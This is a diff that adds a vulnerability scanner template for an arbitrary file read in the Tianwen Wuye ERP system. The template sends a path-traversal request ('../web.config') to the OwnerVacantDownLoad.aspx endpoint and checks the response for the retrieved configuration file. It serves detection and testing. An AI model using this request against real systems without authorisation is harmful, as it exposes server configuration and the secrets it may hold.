@@ -1,0 +1,30 @@
+id: tianwen-wuye-erp-file-read
+info:
+  name: Tianwen Wuye ERP Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Tianwen Wuye ERP system contains an arbitrary file read vulnerability in the OwnerVacantDownLoad endpoint.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/HM/M_main/InformationManage/OwnerVacantDownLoad.aspx?OwnerVacantFile=../web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "filename=web.config"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
+      - type: word
+        part: body
+        words:
+          - "<configuration>"
